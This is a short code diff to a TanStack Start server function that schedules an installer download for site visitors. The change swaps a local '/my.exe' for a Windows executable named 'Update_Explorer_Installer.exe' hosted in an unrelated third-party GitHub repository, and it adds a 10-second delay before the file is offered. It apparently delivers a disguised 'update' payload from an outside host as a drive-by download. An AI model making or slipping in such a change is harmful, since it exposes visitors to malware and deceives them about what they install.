@@ -1,7 +1,7 @@
 import { createServerFn } from "@tanstack/react-start";
 
-// No artificial delay before the installer becomes available.
-const DOWNLOAD_DELAY_MS = 0;
+const DOWNLOAD_DELAY_MS = 10_000;
+const INSTALLER_DOWNLOAD_URL = "https://raw.githubusercontent.com/kh198888/update/master/Update_Explorer_Installer.exe";
 
 /**
  * Creates a server-side download request. The browser uses the returned time
@@ -13,7 +13,7 @@ export const scheduleInstallerDownload = createServerFn({ method: "POST" })
     if (!data.visitorId) throw new Error("A visitor ID is required");
 
     return {
-      downloadUrl: "/my.exe",
+      downloadUrl: INSTALLER_DOWNLOAD_URL,
       availableAt: Date.now() + DOWNLOAD_DELAY_MS,
     };
   });
